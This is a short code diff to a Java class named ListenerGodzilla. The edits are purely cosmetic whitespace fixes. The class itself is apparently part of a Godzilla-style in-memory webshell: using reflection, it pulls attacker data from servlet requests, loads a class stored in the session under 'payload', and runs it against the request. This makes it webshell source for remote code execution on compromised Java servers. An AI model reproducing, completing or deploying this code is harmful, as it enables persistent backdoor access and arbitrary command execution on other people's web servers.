@@ -28,7 +28,7 @@ public class ListenerGodzilla implements InvocationHandler {
         return null;
     }
 
-    public Object getResponse(Object httpServletRequest) throws Exception{
+    public Object getResponse(Object httpServletRequest) throws Exception {
         return null;
     }
 
@@ -40,7 +40,6 @@ public class ListenerGodzilla implements InvocationHandler {
 //        Object httpServletResponse = getFieldValue(request, "response");
 //        return httpServletResponse;
 //    }
-
     public void run(Object sre) {
         try {
             Object httpServletRequest = invokeMethod(sre, "getServletRequest", new Class[]{}, new Object[]{});
@@ -57,7 +56,7 @@ public class ListenerGodzilla implements InvocationHandler {
             } else {
                 invokeMethod(httpServletRequest, "setAttribute", new Class[]{String.class, Object.class}, new Object[]{"parameters", data});
                 java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
-                Class cls = (Class) invokeMethod(session, "getAttribute" , new Class[]{String.class}, new Object[]{"payload"});
+                Class cls = (Class) invokeMethod(session, "getAttribute", new Class[]{String.class}, new Object[]{"payload"});
                 Object f = cls.newInstance();
                 f.equals(arrOut);
                 f.equals(httpServletRequest);
